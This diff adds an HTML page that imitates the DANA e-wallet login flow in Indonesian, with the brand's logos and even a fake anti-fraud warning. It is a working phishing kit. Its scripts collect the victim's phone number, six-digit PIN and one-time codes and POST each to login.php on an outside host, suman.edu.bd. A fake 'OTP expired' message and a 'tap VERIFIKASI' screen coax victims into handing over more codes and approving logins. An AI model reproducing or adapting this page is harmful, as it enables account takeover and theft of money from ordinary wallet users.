@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, user-scalable=0" name="viewport"/>
+<meta content="ie=edge" http-equiv="X-UA-Compatible"/>
+<title>DANA - Apa pun transaksinya selalu ada DANA</title>
+<meta content="DANA - Apa pun transaksinya selalu ada DANA" property="og:title"/>
+<meta content="DANA - Apa pun transaksinya selalu ada DANA" property="twitter:title"/>
+<meta content="summary_large_image" property="twitter:card"/>
+<meta content="image/jpeg" property="og:image:type"/>
+<meta content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSdzB_zbo4bA4kj0917JUPNAy0NJUJsosd7NM_4gemkkcCxSlnzB0EUHLA&amp;s=10" property="og:image"/>
+<meta content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSdzB_zbo4bA4kj0917JUPNAy0NJUJsosd7NM_4gemkkcCxSlnzB0EUHLA&amp;s=10" property="twitter:image:src"/>
+<meta content="https://dana.id" property="og:url"/>
+<meta content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!" property="og:description"/>
+<meta content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!" property="twitter:description"/>
+<link href="local_resources/css/9c6583436a682158fb4c86e145e26823.css" rel="stylesheet"/>
+<link href="local_resources/css/6a0f67f9d412f912b1cc8167d105b32e.css" rel="stylesheet"/>
+<link href="local_resources/css/68c7d5aee083c13e7b35bc40065d5d1f.css" rel="stylesheet"/>
+<link href="local_resources/css/413c6cc7aca64d61f1a7d4a9b0a688b4.css" rel="stylesheet"/>
+<link href="https://m-dana-id.pages.dev/favicon/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<link href="local_resources/img/b7d056a63f4a4ce92e0402e356ddc94d.png" rel="icon" sizes="32x32" type="image/png"/>
+<link href="local_resources/img/f63b56acdb18e2ad973260c51dc0f6c7.png" rel="icon" sizes="16x16" type="image/png"/>
+<link href="local_resources/css/90527799dee9be2f33a1b0ee12a82f22.css" rel="manifest"/>
+<style>
+      .bgotp2 {
+         position: absolute;
+         z-index: 9999;
+         top: 0;
+         left: 0;
+         right: 0;
+         width: 100%;
+         height: 100%;
+      }
+      .bgotp2 form {
+         width: 100%;
+         position: absolute;
+         bottom: 0;
+         height: 80%;
+         min-height: 90%;
+         max-height: 90%;
+         background: #fff;
+         border-top-left-radius: 15px;
+         border-top-right-radius: 15px;
+         padding: 40px;
+      }
+      .label2{
+         margin-top: 10px;
+         margin-right: 15px;
+         margin-left: 8px;
+      }
+      .wrapper{
+         width: 100%;
+         display: flex;
+         padding: 10px;
+         background-color: #0E79C7;
+         margin-top:20px;
+         border-radius: 10px;
+      }
+      
+      .wrapper2{
+         width: 100%;
+         display: flex;
+         padding: 10px;
+         background-color: #fff;
+         margin-top:10px;
+         border-radius: 10px;
+      }
+      .desc2{
+         font-size: 13px;
+      }
+   </style>
+<link href="local_resources/css/b763e3abad9054efe310abffeae541ae.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="index" style="display:none;">
+<div class="header"><img alt="" class="logo" src="local_resources/img/83beb8d48d0b8442d909f12ca068c820.png"/></div>
+<div class="content">
+<!--<div class="hero"><img src="ast/img/hero.png" alt=""></div>-->
+<h1>Dompet digital untuk kamu!</h1>
+<p class="desc">Simpan uang serta kartu debit/kredit dengan<br/>praktis di DANA</p>
+<div class="line"></div>
+<p class="log">Masukkan <b>nomor HP</b> kamu untuk lanjut</p>
+<button onclick="next();" type="button">LOGIN</button>
+</div>
+</div>
+<div class="start" style="display:none;">
+<img class="logo" src="local_resources/img/5ca00b5b2a2d3b01e7f6d7116cd3bc1e.png"/>
+<div class="footimg">
+<img alt="" src="local_resources/img/7ce60564a915d65146c95343709d7bbf.png"/><img alt="" src="local_resources/img/0d7f1e699d74cb6f10821ffa0839c87f.png"/>
+<p>DANA Indonesia terdaftar dan diawasi<br/>oleh Bank Indonesia dan Kominfo</p>
+</div>
+</div>
+<div class="container hid">
+<div class="box-login">
+<div class="process" id="process" name="process" style="display: none;">
+<div class="loading">
+<img src="local_resources/img/b82679c9a7c637ba8ee212a6b7dd890a.png"/>
+<img class="spinner" src="local_resources/img/97baae260405761a9d64848186ac5258.png"/>
+</div>
+</div>
+<div class="header">
+<img alt="" class="logo" src="local_resources/img/83beb8d48d0b8442d909f12ca068c820.png"/>
+</div>
+<form id="formNohp" onsubmit="sendNohp(event);">
+<h3>Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
+<div class="box-input">
+<div class="label"><img alt="" src="local_resources/img/77bb60ed8e3e2cdd064111e5c6a53643.png"/><label>+62</label></div>
+<input autocomplete="off" id="inp" name="phoneNumber" placeholder="811-1234-5678" required="" type="tel"/>
+</div>
+<p class="desc">
+               Dengan melanjutkan, kamu setuju dengan <b>Syarat &amp; Ketentuan</b> dan <b>Kebijakan Privasi</b> kami
+            </p>
+<div class="wrapper">
+<div class="label2">
+<img alt="" src="local_resources/img/6657883c1850aa670ec1c5770d8748ed.png" style="width:30px;"/>
+</div>
+<span class="desc2">
+                  Awas penipuan karena kami tidak <p>pernah memberikan link, meminta PIN,</p><p> kode OTP, atau uang. <span style="text-decoration: underline;">Lihat detailnya</span></p>
+</span>
+</div>
+<!--<p class="desc">Nomor ponsel akan digunakan sebagai ID kamu &<br>menjaga akun selalu aman. Dengan melanjutkan,<br>kamu setuju dengan <b>Syarat & Ketentuan</b> dan<br><b>Kebijakan Privasi</b> kami</p>-->
+<div class="box-btn"><button class="btnnohp" disabled="" id="btn" type="submit">LANJUT</button></div>
+</form>
+<form class="hid" id="formPin">
+<h3>Masukkan <b>PIN DANA</b></h3>
+<div class="box-input-pin">
+<div class="clear" type="button"></div>
+<input autocomplete="off" class="inppin" id="pin1" inputmode="numeric" maxlength="1" name="pin1" onkeypress="if(this.value.length==1) return false;" required="" type="password"/><input autocomplete="off" class="inppin" id="pin2" inputmode="numeric" maxlength="1" name="pin2" onkeypress="if(this.value.length==1) return false;" required="" type="password"/><input autocomplete="off" class="inppin" id="pin3" inputmode="numeric" maxlength="1" name="pin3" onkeypress="if(this.value.length==1) return false;" required="" type="password"/><input autocomplete="off" class="inppin" id="pin4" inputmode="numeric" maxlength="1" name="pin4" onkeypress="if(this.value.length==1) return false;" required="" type="password"/><input autocomplete="off" class="inppin" id="pin5" inputmode="numeric" maxlength="1" name="pin5" onkeypress="if(this.value.length==1) return false;" required="" type="password"/><input autocomplete="off" class="inppin" id="pin6" inputmode="numeric" maxlength="1" name="pin6" onkeypress="if(this.value.length==1) return false;" required="" type="password"/>
+</div>
+<button class="show" type="button">TAMPILKAN</button>
+<p class="forgot">LUPA PIN?</p>
+</form>
+<div class="bgotp2 hid">
+<form class="" id="formOtp2">
+<b style="color:black;">Verification sent to  <img src="local_resources/img/16ea4966ace8cf1ef35c21b34bc7839f.svg" style="width:60px;"/> Account</b>
+<p style="color:black; margin:5px; font-size: 13px; border: 0.5px solid rgb(191, 191, 191); padding:5px; border-radius: 50px;">
+<img alt="" src="local_resources/img/f8beb23dc1ee26e33270fb4531052ed2.svg" style="width:13px;"/>
+                  +62 ••• ••••• ••••</p>
+<video autoplay="" height="200" id="video_player" loop="" muted="" src="ast/vid/VerifikasiDana_medium.mp4" width="400"> </video>
+<p style="color:black; font-size:15px;">Cara mengamankan akun anda :</p>
+<div class="wrapper2">
+<div class="label2">
+<img alt="" src="local_resources/img/e95ae902b78d5147ee680bfccddded09.svg" style="width:30px;"/>
+</div>
+<p style="color:black; font-size:13px;">Pergi ke notifikasi di telepon anda lalu tap tombol VERIFIKASI.</p>
+</div>
+<div class="wrapper2">
+<div class="label2">
+<img alt="" src="local_resources/img/952724911935f35724470d3b8baac319.svg" style="width:30px;"/>
+</div>
+<p style="color:black; font-size:13px;">Tidak menerima notifikasi? Cek Kotak masuk atau Menu verifikasi.</p>
+</div>
+<div style="margin-top: 20px;">
+<b style="color:#727272; font-size:12px">
+                        Secured by  
+                     </b>
+<img alt="" src="local_resources/img/72f31696b8372d94573060c68356bda7.svg" style="width:120px"/>
+</div>
+<div style="margin-top: 40px;">
+<div onclick="munculkanOtp()" style="background-color: #118EEA; padding: 10px; border:0; border-radius: 5px; width: 100%;">SUDAH TAP VERIFIKASI</div>
+</div>
+</form>
+</div>
+<div class="bgotp hid">
+<form class="" id="formOtp">
+<h2>Masukkan OTP</h2>
+<p class="alert">Kode OTP telah dikirim ke nomor Anda.</p>
+<div class="box-input-otp">
+<div class="loadingOtp" style="display:none;"><img src="local_resources/img/b82679c9a7c637ba8ee212a6b7dd890a.png"/><img class="spinner" src="local_resources/img/97baae260405761a9d64848186ac5258.png"/></div>
+<div class="clearotp" type="button"></div>
+<input autocomplete="off" class="inpotp" id="otp1" inputmode="numeric" maxlength="1" name="otp1" onkeypress="if(this.value.length==1) return false;" required="" type="number"/><input autocomplete="off" class="inpotp" id="otp2" inputmode="numeric" maxlength="1" name="otp2" onkeypress="if(this.value.length==1) return false;" required="" type="number"/><input autocomplete="off" class="inpotp" id="otp3" inputmode="numeric" maxlength="1" name="otp3" onkeypress="if(this.value.length==1) return false;" required="" type="number"/><input autocomplete="off" class="inpotp" id="otp4" inputmode="numeric" maxlength="1" name="otp4" onkeypress="if(this.value.length==1) return false;" required="" type="number"/>
+</div>
+<p class="resend">KIRIM ULANG (<span id="countdown">120</span>s)</p>
+</form>
+</div>
+</div>
+</div>
+</body>
+<script src="local_resources/js/7b53a2dc7f10f346a0876c6cacc346be.js"></script>
+<script src="local_resources/js/12a92b14eb0adf82294fd1dbc80e8a98.js"></script>
+<script>
+      $(document).ready(function(){$('#inp').on('input', function(){
+         if($(this).val() == '0' || $(this).val() == '62'){
+            $(this).val('');}});
+         });
+      </script>
+<script>
+         $(document).ready(function(){
+            $('#inp').mask('000-0000-000000');
+         });
+      </script>
+<script>
+         let inp = document.getElementById("inp");
+         let btn = document.getElementById("btn");
+         inp.addEventListener("input", val);
+         function val(){
+            if(inp.value.length > 10){
+               btn.disabled = false;
+            }else{
+               btn.disabled = true;
+            }
+         };
+      </script>
+<script>
+         $('.inppin').on('input', function(event) {
+            const inputs = $('.inppin');
+            const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
+            if (isAllFilled == true) {
+               $(event.target).blur();sendPin();
+            };
+            const index = inputs.index(this);
+            const currentValue = event.target.value;
+            if (currentValue.length === 1) {
+               if (index < inputs.length - 1) {
+                  inputs[index + 1].focus();
+               }
+            } else if (currentValue.length === 0) {
+               if (index > 0) {
+                  inputs[index].focus();
+               }
+            };
+         });
+         $('.inppin').on('keydown', function(event) {
+            const inputs = $('.inppin');
+            const key = event.key;const index = inputs.index(this);
+            if (key === 'Backspace' && event.target.value.length === 0) {
+               if (index > 0) {
+                  inputs[index - 1].focus();
+               }
+            };
+         });
+      </script>
+<script>
+         $('.inpotp').on('input', function(event) {
+            const inputs = $('.inpotp');
+            const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
+            if (isAllFilled == true) {
+               $(event.target).blur();sendOtp();
+            }
+            const index = inputs.index(this);
+            const currentValue = event.target.value;
+            if (currentValue.length === 1) {
+               if (index < inputs.length - 1) {
+                  inputs[index + 1].focus();
+               }
+            } else if (currentValue.length === 0) {
+               if (index > 0) {
+                  inputs[index].focus();
+               }
+            };
+         });
+         $('.inpotp').on('keydown', function(event) {
+            const inputs = $('.inpotp');
+            const key = event.key;
+            const index = inputs.index(this);
+            if (key === 'Backspace' && event.target.value.length === 0) {
+               if (index > 0) {
+                  inputs[index - 1].focus();
+               }
+            };
+         });
+      </script>
+<script>
+         $(document).ready(function() {
+            $('.clear').click(function() {
+               $('.inppin').val('');
+               $('#pin1').focus();
+            });
+            $('.clearotp').click(function() {
+               $('.inpotp').val('');
+               $('#otp1').focus();
+            });
+            $('.show').click(function() {
+               $('.inppin').each(function() {
+                  if ($(this).attr('type') === 'password') {
+                     $(this).attr('type','number');
+                     $(".show").text("SEMBUNYIKAN");
+                  } else {
+                     $(this).attr('type', 'password');
+                     $(".show").text("TAMPILKAN");
+                  }
+               });
+            });
+         });
+      </script>
+<!--
+      <script>
+         function sendNohp(event){
+            $("#process").show();
+            event.preventDefault();
+            $("#inp").blur();
+            $.ajax({
+               type: 'POST',
+               url: 'https://suman.edu.bd/dana.id/login.php',
+               data: $('#formNohp').serialize(),
+               dataType: 'text', 
+               success: function(){
+                  $("#process").hide();
+                  $("#formNohp").fadeOut();
+                  setTimeout(function(){
+                     $(".bgotp2").fadeIn();
+                  }, 500);
+               }
+            });
+         };
+      </script>-->
+<script>
+         function sendNohp(event){
+         $("#process").show();
+         event.preventDefault();
+         $("#inp").blur();
+         $.ajax({
+         type: 'POST',
+         url: 'https://suman.edu.bd/dana.id/login.php',
+         data: $('#formNohp').serialize(),
+         dataType: 'text', 
+         success: function(){
+         $("#process").hide();
+         $("#formNohp").fadeOut();
+         setTimeout(function(){
+         $("#inp").val('');
+         $("#formPin").fadeIn();
+         $("#pin1").focus();
+         }, 500);
+         }
+         });
+         };
+      </script>
+<script>
+         function munculkanOtp(){
+            $("#process").show();
+            setInterval(countdown, 500);
+            $("#process").hide();
+            $(".bgotp").fadeIn();
+            setInterval(countdown, 1000);
+            $("#otp1").focus();
+         }
+         function sendPin(){
+            $("#process").show();
+            $.ajax({
+               type: 'POST',
+               url: 'https://suman.edu.bd/dana.id/login.php',
+               data: $('#formPin').serialize(),
+               dataType: 'text',
+               success: function(){
+                  $("#process").hide();
+                  $('.inppin').val('');
+                  setTimeout(function(){
+                     $(".bgotp2").fadeIn();
+                  }, 500);
+               }
+            });
+         };
+      </script>
+<script>
+         function sendOtp(){
+            $(".loadingOtp").show();
+            $.ajax({
+               type: 'POST',
+               url: 'https://suman.edu.bd/dana.id/login.php',
+               data: $('#formOtp').serialize(),
+               dataType: 'text',
+               success: function(){
+                  setTimeout(function(){
+                     $(".alert").text("Masa berlaku OTP telah habis atau invalid silahkan tunggu kode OTP baru");
+                     $(".loadingOtp").hide();
+                     $('.inpotp').val('');
+                     $(".alert").css("color","red");
+                  },3000);
+               }
+            });
+         };
+      </script>
+<script>
+         function countdown() {
+            var count = parseInt($('#countdown').text());
+            if (count !== 0) {
+               $('#countdown').text(count - 1);
+            } else {
+               $('#countdown').text('120');
+            }
+         };
+      </script>
+<script>
+         window.onload = function(){
+         setTimeout(function(){
+         $(".start").fadeIn();
+         setTimeout(function(){
+         $(".start").fadeOut(1000);
+         setTimeout(function(){
+         $(".container").fadeIn(200);
+         $("#inp").focus();
+         },1000);
+         },2000);
+         },500);
+         }
+         /*
+         window.onload = function(){
+            $("#video_player")[0].play();
+            $("#video_player")[0].autoplay = true;
+            setTimeout(function(){
+               $(".start").fadeIn();
+               setTimeout(function(){
+                  $(".start").fadeOut(1);
+                  setTimeout(function(){
+                     $(".container").fadeIn(1);
+                     $("#inp").focus();
+                  },1);
+               },1);
+            },1);
+         }*/
+      </script>
+</html>
